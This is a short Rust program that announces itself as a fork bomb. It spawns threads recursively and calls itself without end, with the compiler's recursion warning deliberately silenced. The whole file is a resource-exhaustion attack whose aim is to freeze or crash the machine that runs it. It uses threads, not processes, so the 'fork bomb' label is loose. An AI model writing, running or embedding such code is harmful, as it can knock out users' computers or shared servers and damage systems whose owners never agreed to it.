fn main() {
    println!("Fork bomb initiated ... ");
    spawn_recursive();
}

#[allow(unconditional_recursion)]
fn spawn_recursive() {
    println!("Spawning process ... ");
    std::thread::spawn(spawn_recursive);
    spawn_recursive();
}
